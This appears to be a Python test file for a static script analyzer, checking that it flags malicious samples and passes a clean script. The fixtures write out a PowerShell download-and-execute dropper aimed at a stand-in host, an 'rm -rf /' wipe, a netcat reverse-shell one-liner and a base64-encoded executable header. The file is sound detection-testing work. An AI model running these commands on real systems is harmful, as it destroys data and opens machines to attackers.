"""Tests for safe static script analysis."""

import pytest
from pathlib import Path
from app.scanners.script_analyzer import ScriptAnalyzer, ScriptSeverity


def test_detect_powershell_download_exec(temp_dir):
    ps1 = temp_dir / "dropper.ps1"
    ps1.write_text("""
        $wc = New-Object System.Net.WebClient
        $payload = $wc.DownloadString('http://malicious.example.com/payload.ps1')
        IEX $payload
    """)

    findings = ScriptAnalyzer.analyze_file(ps1)
    assert len(findings) >= 1
    categories = [f.category for f in findings]
    assert "Download & Execute" in categories or "PowerShell Execution" in categories


def test_detect_destructive_shell(temp_dir):
    sh = temp_dir / "nuke.sh"
    sh.write_text("#!/bin/bash\nrm -rf / --no-preserve-root\n")

    findings = ScriptAnalyzer.analyze_file(sh)
    assert len(findings) >= 1
    severities = [f.severity for f in findings]
    assert ScriptSeverity.CRITICAL in severities


def test_detect_reverse_shell(temp_dir):
    sh = temp_dir / "rev.sh"
    sh.write_text("mkfifo /tmp/p; nc -l 10.0.0.1 4444 0</tmp/p | /bin/sh >/tmp/p 2>&1")

    findings = ScriptAnalyzer.analyze_file(sh)
    assert any(f.category == "Reverse Shell" for f in findings)


def test_detect_embedded_pe_in_base64(temp_dir):
    # TVqQAAMAAAAEAAAA is standard Base64 representation of MZ DOS header
    b64_pe = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAA"
    script = temp_dir / "loader.js"
    script.write_text(f"var payload = '{b64_pe}';\nconsole.log('loading');")

    findings = ScriptAnalyzer.analyze_file(script)
    assert any(f.category == "Embedded Executable" for f in findings)


def test_clean_python_script(temp_dir):
    py = temp_dir / "clean.py"
    py.write_text("""
import math

def calculate_area(radius):
    return math.pi * (radius ** 2)

print(calculate_area(5))
    """)

    findings = ScriptAnalyzer.analyze_file(py)
    assert len(findings) == 0
